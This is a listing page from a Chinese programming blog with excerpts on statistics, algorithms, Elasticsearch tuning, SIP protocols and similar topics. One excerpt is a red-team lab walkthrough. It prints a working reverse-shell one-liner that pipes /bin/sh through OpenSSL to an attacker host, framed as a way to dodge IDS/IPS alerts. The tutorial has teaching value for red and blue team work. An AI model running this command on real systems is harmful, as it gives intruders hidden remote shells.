# 二项分布参数 n = 20 # 试验次数 p = 0.5 # 成功的概率 # 泊松分布参数 lambda_ = 5 # 平均发生次数 步骤3：生成概率分布数据
# 生成二项分布数据 binom_data = binom.rvs(n, p, size=1000) # 生成泊松分布数据 poisson_data = poisson.rvs(lambda_, size=1000) 步骤4：绘制概率分布直方图
# 绘制二项分布直方图 plt.figure() plt.hist(binom_data, bins=range(n+2), density=True, alpha=0.5, label='Binomial Distribution') # 绘制泊松分布直方图 plt.hist(poisson_data, bins=range(15), density=True, alpha=0.5, label='Poisson Distribution') plt.xlabel('Number of Successes') plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a190edf87a57f587edc6ff3b613cf5da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a591d03e1d429e272594d987e74e8868/" rel="bookmark">
			学习不同概率分布（二项分布、泊松分布等）概念及基础语法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概率分布是描述随机变量取值的概率情况的函数。常见的概率分布包括二项分布、泊松分布等。
二项分布（Binomial Distribution）：描述了一次试验中成功事件发生的次数的概率分布。它的基础语法如下：
概率质量函数：pmf(k, n, p) 表示在n次试验中成功k次的概率。
累积分布函数：cdf(k, n, p) 表示在n次试验中成功不超过k次的概率。
期望：mean(n, p) 表示n次试验中成功的平均次数。
方差：var(n, p) 表示n次试验中成功的方差。
泊松分布（Poisson Distribution）：描述了在一定时间或空间范围内，事件发生的次数的概率分布。它的基础语法如下：
概率质量函数：pmf(k, λ) 表示在一个固定时间或空间范围内，事件发生k次的概率。
累积分布函数：cdf(k, λ) 表示在一个固定时间或空间范围内，事件发生不超过k次的概率。
期望：mean(λ) 表示事件在一个固定时间或空间范围内发生的平均次数。
方差：var(λ) 表示事件在一个固定时间或空间范围内发生的方差。
除了二项分布和泊松分布，还有其他常见的概率分布如正态分布、指数分布等。学习不同的概率分布可以帮助我们理解和分析实际问题中的随机变量及其分布情况，从而进行概率推断、统计建模等工作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44eae06ef2fe77066e272dbe31b9b4d2/" rel="bookmark">
			动态规划算法的例子：最短路径问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 问题1.1 实例 2. 算法设计2.1 蛮力算法2.2 动态规划算法：多阶段决策过程2.3 总结2.3.1 子问题界定2.3.2 最短路径的依赖关系（算法关键）2.3.3 优化原则：最优子结构性质2.3.4 一个反例 1. 问题 输入：
起点集合{S1，S2，… ，Sn}
终点集合{T1，T2，… ，Tm}
中间结点集
边集E，每条边都有相应的长度
输出：
一条从起点到终点的最短路 （从任意一个起点到任意一个终点，只要是最短路就行）
1.1 实例 绿色的为起点
黄色的为终点
灰色的为中间结点
连接的线为边集，边上的数字为长度
红线的两条路径都是最短的
2. 算法设计 2.1 蛮力算法 考查每一条从某个起点到某个终点的路径，计算长度，从中找出最短路径 在上述实例中，如果网络的层数为k，那么路径条数将接近于2k（每经过一个节结点有两条路）
2.2 动态规划算法：多阶段决策过程 每步求解的问题是后面阶段求解问题的子问题，每步决策将依赖于以前步骤的决策结果 （挑出子问题中的好的结果）
阶段一，考查后面子问题C的选择
先看C1，走上面好C2，走下面好C3都一样C4，走上面好
（图上为字母为up，down） 阶段二，考查B的选择 （考查B的时候还要连带着对C的分析，所以下图比如B1上面写的距离是11）
…最终 2.3 总结 2.3.1 子问题界定 后边界不变，前边界前移
2.3.2 最短路径的依赖关系（算法关键） 2.3.3 优化原则：最优子结构性质 一个最优决策序列的任何子序列本身一定是相对于子序列的初始和结束状态的最优决策序列
如上图子问题就是最优的 2.3.4 一个反例 即求总长度除以10得到的余数最小
蓝色按照动态规划，每个子问题都是mod10后最优的决策红色为实际
不满足优化原则（子问题最优但全局不一定优）不能用动态规划
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f93b82503008955ea2f5475a1bc5c2de/" rel="bookmark">
			几千亿级集群管理，近百个实用优化参数，涵盖集群、索引、客户端
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当涉及管理和优化千亿级数据时，性能优化是至关重要的。在这篇文章中，我们将探讨一些关键的性能优化方向，结合我积累的上百个优化参数的经验，为大规模数据管理提供有价值的见解。
千亿级数据的管理和优化是一项复杂而挑战性的任务。然而，通过有效的性能优化策略，结合数据分区、压缩、索引、缓存、并行处理、资源管理以及数据清洗等方法，我们可以实现卓越的性能，提高数据处理效率，同时确保数据的安全性和合规性。这些优化方向的结合将为大规模数据管理提供可行的解决方案，为数据驱动的决策和应用提供可靠的支持。
希望这篇文章为您提供了有关性能优化的重要见解，帮助您更好地管理千亿级数据。无论您是处理金融数据、大数据分析、人工智能、或其他领域，性能优化都将对您的项目和业务产生积极的影响。
在本文中，我给大家提供近百个实用的优化参数，涵盖集群级别、索引级别、客户端级别，三个层面。这些都是两年的几千亿集群优化经验，希望能帮到大家。
参数限制作用范围参数效果参数取值说明相关链接备注集群参数禁止使用 wildcardclusterPUT _cluster/settings
{
"transient": {
"search.allow_expensive_queries": false
}
}禁止使用通配符条件匹配。这通常是一个非常耗费资源的操作。可以考虑使用match来实现同样的效果。禁止使用 通配符匹配索引名称clusterPUT /_cluster/settings
{
"transient": {
"action.destructive_requires_name": true
}
}开启此参数的目的是：防止应用端通配符匹配索引名称，导致单次检索中命中超多个索引，超多个分片。开启后，不能在通过类似于：twitter_tweet_202302*这样来对索引执行操作。删除索引。不允许适用通配符来删除。应该设置参数为falseIndex management settings | Elasticsearch Guide [8.10] | Elastic集群是否允许自动创建索引clusterPUT /_cluster/settings
{
"transient": {
"action.auto_create_index": false
}
}不允许自动创建索引取值false，为不允许自动创建索引。通常来说，自动创建的索引，字段类型会有冗余。Index management settings | Elasticsearch Guide [8.10] | Elastic限制同一个索引的分片，不分配到同一台机器上clustercluster.routing.allocation.same_shard.host: true控制分片分配到不同机器上。解决一台物理机部署多个es节点，分片被分配到同一台机器上多个分片，导致数据倾斜的问题默认为false。单台物理机部署一个节点不需要设置。限制同一个节点上，单个索引最大可分配分片数clusterindex.routing.allocation.total_shards_per_node:2控制单个索引，在每个节点上分配的最大分片数。从而保证数据分布足够的均匀如果将将参数设置成1，则可以保证数据分布绝对的平衡。但是在在节点数小于单个索引的总的分片数的时候，会有分片不能被分配。导致集群为red或者 yellow状态。在索引在集群节点数远大于单个索引总的分片数的时候，适合设置为1。设置集群在什么时候开始平衡clustercluster.routing.allocation.allow_rebalance此参数，解决在集群长期处于yellow状态下，导致集群分片分配不平衡的问题。可以设置成indices_primaries_active，只要主分片都在，就可以去做平衡。always - 一直允许重新平衡。
indices_primaries_active - 只有当集群中的所有的 primaries 被分配。
indices_all_active - ( 默认 )只有当集群中的所有分片 ( primaries and replicas ) 被分配。clustercluster.routing.allocation.node_concurrent_recoveries限制每个节点可以同时执行的恢复操作数该参数用于限制每个节点并发恢复的分片数。默认值为2，可以通过修改该参数来限制每个节点并发恢复的分片数，以避免节点过载clusterindices.recovery.max_bytes_per_sec限制每个节点的恢复操作的速度，以避免恢复过程过多占用网络带宽该参数用于限制每个节点恢复数据时的最大网络吞吐量。默认值为40mb，可以通过修改该参数来限制每个节点恢复数据时的最大网络吞吐量，以避免节点过载。clustercluster.routing.allocation.cluster_concurrent_rebalance限制集群重新平衡操作的并发数clusterindices.store.throttle.max_bytes_per_sec控制写入磁盘的速度。默认情况下，此限制是关闭的，可能会导致磁盘写入速度过快，占用大量的磁盘带宽clustercluster.routing.allocation.balance.shard控制分片的负载均衡策略。默认情况下，这个限制是开启的，Elasticsearch会自动将分片分配到负载较低的节点上。可以将这个限制关闭，以避免负载均衡带来的网络带宽占用和资源消耗clusterhttp.enabled:false在数据节点上添加此配置，可以保证 data 节点服务器只需处理创建/更新/删除/查询索引数据等操作每天做forceMergeclusterPOST mblog_info_202212-000079/_forcemerge?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f93b82503008955ea2f5475a1bc5c2de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90225355a10efc237130d2d2c64d3485/" rel="bookmark">
			ES 8.x 向量检索性能测试 &amp; 把向量检索性能提升100倍！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		向量检索不仅在的跨模态检索场景中应用广泛，随着chat gpt的火热，es的向量检索，在Ai领域发挥着越来越大的作用。
本文，主要测试es的向量检索性能。我从8.x就开始关注ES的向量检索了。当前ES已经发布到 8.10 版本。以下是官方文档的链接：
https://www.elastic.co/guide/en/elasticsearch/reference/current/release-highlights.html
本文，在测试的时候使用的是8.3版本（因为测试的时候只发布到这里 ）。
在本文中，妥妥滴都是干货，因为不仅有性能测试，还有搜索性能优化。这里预告以下，在千万规模数据中做的测试，将检索性能提升了将近100倍。在本文中可以看看性能是如何被优化的。
一、背景 测试ES - KNN向量检索性能、写入性能、准确度、资源占用情况。针对该需求，搭建一个8.3.0版本的ES节点，使用ES8.3.0版本的java Client高级API来调用KNN搜索。
测试资源介绍 机器情况
ES情况
插件
数据规模
数据情况
单台机器
48核心
64G内存
磁盘为HDD盘（也测了SSD盘）
单个节点
单个索引
单个分片
不带副本
优化后的段的个数为1
ES版本 8.3.0
JVM31G
elastiknn
34W（340507）1000W 数据结构（索引结构和配置）
结构：三个字段，一个向量字段存放512维度的向量数据。一个路径字段，存放图片路径，一个文档id
二、测试结果 写入性能 批量写数据，使用es bulk提交数据，数据刷新间隔时间30s（近实时）。
数据量
总耗时
平均每张耗时
340507
170s
0.5ms
写入数34万，耗时170s。
最佳查询性能 最终的性能如下表,千万级别的检索可以在毫秒级别。经历了两轮优化。
数据规模
检索 top-N
平均耗时
最长耗时
34w
（512维度）
检索 top-1
[3] ms
[110] ms
检索 top-10
[6] ms
[150] ms
检索 top-100
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90225355a10efc237130d2d2c64d3485/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/487f3953b47134210f9ce332b400f80a/" rel="bookmark">
			程序员读《孙子兵法》读书笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近一直在读《孙子兵法》，程序员不要一味的读技术类书籍，也可以适当的读读中国儒家经典书籍，修身养性嘛；
最近读到《孙子兵法》中有专门的用间篇，也就是"jian谍"；
"jian谍"分为5种，称之为五间：因间、内间、反间、死间、生间；
所谓“乡间”，是利用敌国乡人做间谍。
所谓“内间”，是利用敌方官吏做间谍。
所谓“反间”，是利用敌方间谍为我所用。
所谓“死间”，就是制造假情报，并通过潜入敌营的我方间谍传给敌间(使敌军受骗，一旦事情败露，我方间谍不免被处死)。
所谓“生间”，是探知敌人情报后能够生还的人。
如果5种间能很好的配合使用，将在敌我双方较量的过程中发挥巨大的作用，《孙子兵法》是中国的一本很古老的兵书，最近一直在读，受益匪浅。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e3fab78f8f269c0e958ea44edb2fc75/" rel="bookmark">
			CSP-J2023总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这次我考的并不太好，才 195 195 195 分，第一题都没有过。
分数 小苹果公路一元二次方程旅游巴士 50 \color{gold}50 50 75 \color{lightgreen}75 75 60 \color{orange}60 60 10 \color{red}10 10 问题 对时间的规划不平衡有点紧张考前模拟赛改题不太认真 规划 我的规划大概有这么几个：
赛前 在模拟赛之后改题认真一点。上课不再讲话，不再玩奇奇怪怪的东西也许分就更高一点。 赛时 如果我对 l o n g l o n g long~long long long 等的细节问题的掌控稍微细心一点应该能分高一点。对时间的规划稍微平衡一点，否则一直死磕某道题时间可能不够。别紧张。 赛后 积极总结，总结出自己的问题，下次考试不要再犯 另外 小声吐槽一句：考场的键盘是的有 亿 点难用 … \tiny{小声吐槽一句：考场的键盘是的有\Huge{亿}\tiny点难用\dots} 小声吐槽一句：考场的键盘是的有亿点难用…
题目情况 T1 小苹果 错误原因 这道题应该是我的数学的问题。
我想了半个小时，最后只打了一个暴力，而其正解是数学。
AC代码 #include &lt;bits/stdc++.h&gt; #define il inline #define ll long long using namespace std; ll n; int main() { cin &gt;&gt; n; int t = n; int ans = 0, ans1 = 0; while (n % 3 !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e3fab78f8f269c0e958ea44edb2fc75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd6db5b5129f322690cad54e53d701fe/" rel="bookmark">
			小程序原生开发中的onLoad和onShow
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在小程序的原生开发中，onLoad和onShow是两个常用的生命周期函数，用于管理页面的加载和显示。
onLoad：该函数会在页面加载时触发。当页面第一次加载时，它会被调用一次，之后切换到其他页面再返回时不会再触发。可以在onLoad函数中进行一些初始化操作，如获取页面的参数、设置页面的初始数据等。 Page({ onLoad(options) { console.log('页面加载'); console.log('页面参数', options); } }) onShow：该函数会在页面显示/重新显示时触发。每次切换到页面时都会触发onShow，包括页面的初始化加载、从其他页面返回到当前页面等情况。可以在onShow函数中进行一些需要在每次显示页面时执行的逻辑，如刷新页面数据、更新UI等。 Page({ onShow() { console.log('页面显示'); // 执行一些需要在每次页面显示时执行的逻辑 } }) 需要注意的是，当小程序从后台进入前台时也会触发onShow函数，因此如果需要处理特定的场景，可以结合onShow和App生命周期的onShow来实现。
总结：
onLoad触发时机：页面加载时调用一次，之后切换到其他页面再返回不会再次触发。onShow触发时机：页面显示/重新显示时都会触发，包括页面的初始化加载、从其他页面返回等。onLoad适合进行页面的初始化操作。onShow适合进行需要在每次显示页面时执行的逻辑操作。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f3b3d6b2476b2c6d5e938fecd2d0697/" rel="bookmark">
			npm run build上线打包空白
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当使用npm run build打包的时候会出现空白是因为，大概率是路径发生了错误
在vue.config.js文件夹里边添加
然后在路由中的index.js中把mode修改为‘hash’ 再重新启动npm run build,然后就可以在网页中打开了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8430d0be5ebc0df77708b38965fda830/" rel="bookmark">
			java通过IO流下载保存文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 我们在开发过程中，可能会遇到需要到远程服务器上下载文件的需求，一般我们的文件可能会有一个url地址，我们拿到这个地址，可以构建URLConnection对象，之后可以根据这个URLConnection来获取InputStream，之后，就可以进行读取并保存文件到本地。
如下所示是一个简单的读取url文件地址，并下载文件到本地conf目录的示例：
package com.xxx.io; import org.apache.commons.io.IOUtils; import java.io.File; import java.io.IOException; import java.io.OutputStream; import java.net.URL; import java.net.URLConnection; import java.nio.file.Files; public class URLFileCopy { private static final String URL_FILE = "http://localhost:8000/lion.jpg"; public static void main(String[] args) { try (OutputStream outputStream = Files.newOutputStream(new File("conf/test.jpg").toPath())) { URL url = new URL(URL_FILE); URLConnection connection = url.openConnection(); IOUtils.copy(connection.getInputStream(), outputStream); } catch (IOException e) { throw new RuntimeException(e); } } } 这段代码，读取http://localhost:8000/lion.jpg ，并把文件存为本地conf/test.jpg。运行动态截图：
conf目录开始没有test.jpg文件，运行程序，生成了test.jpg。这里对保存的文件进行了修改名称，在实际中，我们可能需要保留原始的文件名，这里只是测试保存这个动作。这里没有通过构建复杂的io流来先读取，然后写入文件，这里调用了IOUtils.copy()这个方法，这个工具类在commons-io库中，我们的项目一般都会引入这个库，所以可以很方便使用起来。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/443dd384bcd32186597c8b84ea61e068/" rel="bookmark">
			《红蓝攻防对抗实战》八.利用OpenSSL对反弹shell流量进行加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前文推荐：
《红蓝攻防对抗实战》一. 隧道穿透技术详解《红蓝攻防对抗实战》二.内网探测协议出网之TCP/UDP协议探测出网《红蓝攻防对抗实战》三.内网探测协议出网之HTTP/HTTPS协议探测出网《红蓝攻防对抗实战》四.内网探测协议出网之ICMP协议探测出网《红蓝攻防对抗实战》五.内网探测协议出网之DNS协议探测出网《红蓝攻防对抗实战》六.常规反弹之利用NC在windows系统执行反弹shell《红蓝攻防对抗实战》七.常规反弹之利用NC在Linux系统执行反弹shell 在实战攻防对抗中，使用常规反弹shell会有一个缺点，那就是所有通过shell传输的流量都是以明文的方式发送的，可以被安全防护设备（如IDS、IPS等）获取到通信传输的数据内容，会导致被触发告警拦截，红队人员会使用一种加密的反弹shell方式，对传输的数据内容进行混淆加密，这里我们使用OpenSSL来进行加密反弹shell，本次实验环境如图1-1所示。
​
图1-1 OpenSSL 反弹shell实验拓扑图
1）首先在使用OpenSSL反弹shell之前，需要对攻击机进行配置，手动执行openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes命令生成自签名证书，其OpenSSL使用参数如表1-1所示，在生成自签名证书过程中，会提示输入证书信息，在证书信息方面可以直接按回车键不进行设置，如图1-2所示，最后会生成cert.pem和key.pem这两个文件。
表1-1 常见使用参数
参数
作用
-new
表示生成一个新的证书签署要求
-x509
专用于生成CA自签证书
-key
指定生成证书用到的私钥文件
-out FILNAME
指定生成的证书的保存路径
-days
指定证书的有效期限，单位为day，默认是365天
-notes
生成的私钥文件不会被加密
​
图1-2 攻击机生成自签名证书
2）当攻击机生成自签名证书后，执行openssl s_server -quiet -key key.pem -cert cert.pem -port 8888命令，使OpenSSL监听本地攻击机的8888端口，来启动一个SSL/TLS server服务。如图1-3所示。
​
图1-3攻击机开启监听
3）当攻击机开启监听后，在目标服务器进行反弹 shell 操作，执行mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.2:8888 &gt; /tmp/s; rm /tmp/s命令，即可将目标服务器的shell反弹到攻击机上，如图1-4所示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/443dd384bcd32186597c8b84ea61e068/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4145c612eff47455a9414920a76be0fb/" rel="bookmark">
			GB28181学习（十三）——订阅与通知
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		事件订阅 要求 事件订阅应使用SUBSCRIBE方法；事件源接收事件订阅时，事件源应向事件观察者发送确认消息；事件源： 联网系统SIP服务器报警设备移动设备被集成的卡口系统等 事件观察者 联网系统SIP服务器客户端 事件： 报警事件移动设备位置通知事件PTZ精准位置变化事件等 流程 协议接口 MESSAGE消息头Content-type头域为Content-type:Application/MANSCDP+xml；报警事件订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装；移动位置上报事件订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装；PTZ精准位置变化事件订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装； 事件通知 要求 事件源接受事件订阅后，在事件触发后应立即通知事件观察者，事件观察者应向事件源发送事件收到的确认消息；事件通知使用NOTIFY方法；事件源： 联网系统SIP服务器报警设备移动设备被集成的卡口系统等 事件观察者 联网系统SIP服务器客户端 事件 报警事件移动设备位置通知事件PTZ精准位置变化事件等 流程 协议接口 MESSAGE消息头Content-type头域为Content-type:Application/MANSCDP+xml；报警事件订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装；移动位置上报事件订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装；PTZ精准位置变化事件订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装； 目录订阅 要求 目录订阅应使用SUBSCRIBE方法；目录拥有者接收目录订阅后，应向目录订阅者发送请求确认消息；目录拥有者 联网系统有子设备的设备代理设备网关 目录接收者 联网系统有子设备的设备代理设备网关 流程 协议接口 MESSAGE消息头Content-type头域为Content-type:Application/MANSCDP+xml；目录订阅订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装； 目录通知 要求 目录拥有者接收目录订阅后，当目录发生变化时立即通知目录接收者，目录接收者应向目录拥有者发送目录收到的确认消息；目录通知应使用NOTIFY方法；目录拥有者 联网系统有子设备的设备代理设备网关 目录接收者 联网系统有子设备的设备代理设备网关 域间目录订阅通知 流程 协议接口 MESSAGE消息头Content-type头域为Content-type:Application/MANSCDP+xml；目录订阅订阅流程中请求命令消息体采用MANSCDP协议格式定义：请求命令消息体采用XML封装； 代码实现 订阅初始化 pj_init(); pjlib_util_init(); pj_caching_pool_init(&amp;m_cachingPool, &amp;pj_pool_factory_default_policy, 0); pjsip_endpt_create(&amp;m_cachingPool.factory, nullptr, &amp;m_endPoint); pjsip_tsx_layer_init_module(m_endPoint); pjsip_ua_init_module(m_endPoint, nullptr); // 订阅相关 pjsip_evsub_init_module(m_endPoint); pjsip_pres_init_module(m_endPoint, pjsip_evsub_instance()); 创建报警订阅请求 std::string CMySipMedia::CreateAlarmXmlText_(const std::string&amp; eventName, const GBSubscribeContext&amp; subContext) { char szAlarmInfo[500] = { 0 }; pj_ansi_snprintf(szAlarmInfo, 500, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4145c612eff47455a9414920a76be0fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68c11ae764cf421e616ed4dfea30c81f/" rel="bookmark">
			console.log(1024)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1024
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bab70f64094099d3e2c2fd78d6ed3cb5/" rel="bookmark">
			【目标检测】非极大值抑制NMS的原理与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		非极大值抑制（Non-Maximum Suppression，NMS）是目标检测中常用的一种技术，它的主要作用是去除冗余和重叠过高的框，并保留最佳的几个。
NMS计算的具体步骤如下：
首先根据目标检测模型输出结果，得到一系列候选框及其对应的概率分数。
对所有候选框按照概率分数进行降序排序。
选择概率最大的候选框并确定为预测框，同时删除所有与该预测框重叠度（IoU, Intersection over Union）超过预设阈值的候选框。
重复上述步骤直到所有候选框都被处理完毕或达到预设数量限制。
通过这种方式，NMS可以有效地剔除冗余和相互之间高度重叠的边界盒子，并只保留最有可能代表特定物体位置和形状信息的边界盒子。这样可以在后续处理中降低误判、漏判等问题。
Hard NMS和Blending NMS是两种不同类型的NMS。
Hard NMS：这是最常见和传统的NMS类型。在Hard NMS中，我们首先选择一个得分最高（即置信度最高）的候选框，然后删除所有与其有显著重叠（通常根据预设阈值）并且得分较低的候选框。然后对剩余的候选框重复此过程，直到所有候选框都被处理完毕。
Blending NMS：这是一种更为复杂、灵活但计算量稍大的NMS方法。在Blending NMS中，不仅考虑了物体存在概率(得分)，而且还会考虑到物体类别及位置等信息进行综合判断来决定是否保留该bbox或者将多个bbox进行融合处理。具体实现上, Blending Nms会使用权重平均策略对多个bbox进行融合, 权重则取决于每个bbox自身属性(如置信度等)。
总结起来, Hard Nms更加简单粗暴, 直接将与得分最高bbox IoU超过阈值范围内其他box全部删除; 而Blending nms则相对温和些, 采用了一种"软"策略，在处理时尽量保存更多可能性结果并通过平均策略使结果更加准确.
1.Python实现： import numpy as np # 假设boxes为[x_min,y_min,x_max,y_max] def nms(boxes, scores, threshold=0.5): if len(boxes) == 0: return [] x1 = boxes[:, 0] y1 = boxes[:, 1] x2 = boxes[:, 2] y2 = boxes[:, 3] areas = (x2 - x1 + 1) * (y2 - y1 + 1) # 按照score降序排列，取index order = scores.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bab70f64094099d3e2c2fd78d6ed3cb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64caf909f9a734da5904e9c02c2d3ee5/" rel="bookmark">
			win11相关配置指令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		就能修改win11修改密码，不用清楚旧密码方案：输入WIN+R：运行：netplwiz：
详细用户配置：输入WIN+R：运行：lusrmgr.msc
安全配置：输入WIN+R：运行：secpol.msc
网络intenet属性配置：输入WIN+R：运行：inetcpl.cpl
防火墙配置：输入WIN+R：运行：WF.msc
进入控制面板：输入WIN+R：control
进入系统配置：输入WIN+R：msconfig
实测版本: win 11 22H2 (22621.1992)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9566a44d6cb5049e08f54db1bd8996b2/" rel="bookmark">
			开发者版 ONLYOFFICE 文档 7.5：API 和文档生成器更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着版本 7.5 中新功能的发布，我们更新了编辑器、文档生成器、插件和桌面应用程序的 API。阅读本文查看所有详细信息。
用于处理表单的 API 隐藏/显示提交表单按钮：使用 editorConfig.customization.submitForm 参数，可以定义 OFORM 文件的顶部工具栏上是否显示或隐藏“提交”按钮。
var docEditor = new DocsAPI.DocEditor("placeholder", { "editorConfig": { "customization": { ... "submitForm": true, 强制保存的更多参数：在版本7.5中，我们为回调处理程序的forcesavetype参数添加了3类型。如果应用，则每次提交表单时（例如，单击“提交”按钮时）都会执行强制保存请求。
{ "changesurl": "https://documentserver/url-to-changes.zip", "forcesavetype": 3, .... 用于处理文档的 API 更改外部数据源：当用户尝试通过单击编辑器中的“更改源”按钮来更改外部数据源时，将调用新添加的 events.onRequestReferenceSource 事件。具有唯一文件数据和文件路径或名称的对象在数据参数中发送。
单击该按钮时，必须调用 setReferenceSource方法来更改外部数据的来源。调用该方法时，必须添加token来验证参数。如果未声明事件，则不会显示“更改源”按钮。
var onRequestReferenceSource = function () { var referenceData = event.data.referenceData; var path = event.data.path; ... docEditor.setReferenceSource({ "fileType": "xlsx", "path": "sample.xlsx", "referenceData": { "fileKey": "BCFA2CED", "instanceId": "https://example.com", "key": "Khirz6zTPdfd7" }, 关键字段：添加到 document.referenceData 参数的关键字段定义了服务用于从共同编辑会话获取数据的唯一文档标识符。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9566a44d6cb5049e08f54db1bd8996b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c05f1a7fc47c1fb27b0530796eb8f682/" rel="bookmark">
			MPI编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、MPI并行程序设计 1.1 点对点通信——MPI_Send和MPI_Recv 1.2 练习：Jacobi迭代 运行效果：
（迭代零次的结果：#define T 0）
（迭代一次的结果：#define T 1） （迭代两次的结果：#define T 2）
1.3 死锁 运行效果：一直等。。。 修改一下次序： 运行效果：通过。
1.4 优化版本的MPI_Sendrecv结构 1.5 练习：用MPI_Sendrecv实现Jacobi迭代 其他和1.2节中的一样。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71d07cd6462b252f1574c942502dd680/" rel="bookmark">
			基于麻雀算法优化BP神经网络(SSA-BP)的数据回归、分类以及时序预测
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SSA-BP（Sparrow Search Algorithm based BP Neural Network）是一种综合应用于数据回归、分类和时序预测问题的方法，通过优化BP神经网络的性能来提高这些任务的准确性。
对于数据回归问题，SSA-BP可以通过训练集的反向传播算法来优化BP神经网络的权值和阈值，以实现对输入特征与目标数值之间的映射关系建模。通过引入麻雀搜索算法，SSA-BP可以全局优化BP神经网络的参数，以提高回归结果的精确度。
对于数据分类问题，SSA-BP同样可以通过BP神经网络的学习能力来建立分类模型。通过向前传播和反向传播的训练过程，BP神经网络可以优化权值和阈值，从而实现对不同类别的数据进行分类。麻雀搜索算法可以辅助优化BP神经网络的参数，提高分类准确性。
对于数据时序预测问题，SSA-BP可以结合历史时序数据的特征和趋势，预测未来的数值或趋势变化。通过BP神经网络的训练和优化，结合麻雀搜索算法进行全局搜索，可以提高时序预测的准确性和稳定性。
总之，SSA-BP方法在数据回归、分类和时序预测问题上都具有应用潜力。它综合了BP神经网络的学习能力和麻雀搜索算法的全局搜索能力，可以提高这些任务的准确性和效果。
1.基于麻雀算法优化BP神经网络(SSA-BP)的数据回归预测 基于麻雀算法优化BP神经网络的数据回归预测是一种将麻雀算法与BP神经网络相结合的方法，用于进行数据回归预测任务。
麻雀算法是一种启发式优化算法，灵感来源于麻雀群体的觅食行为。它模拟了麻雀在搜索食物时的群体智慧和协作策略。
在这个方法中，首先需要构建一个BP神经网络，用于进行数据回归预测。BP神经网络是一种前馈神经网络，可用于学习和建模非线性关系。
然后，利用麻雀算法对BP神经网络的参数进行优化。麻雀算法通过模拟麻雀群体的觅食过程，使用迭代的方式来搜索最优解。每个麻雀代表着一个候选解，它们根据自身的适应度评价进行迭代更新，以找到最优的网络参数。
最后，通过使用经过麻雀算法优化后的BP神经网络进行数据回归预测。这个优化的神经网络可以更好地拟合和预测数据集，提高预测精度。
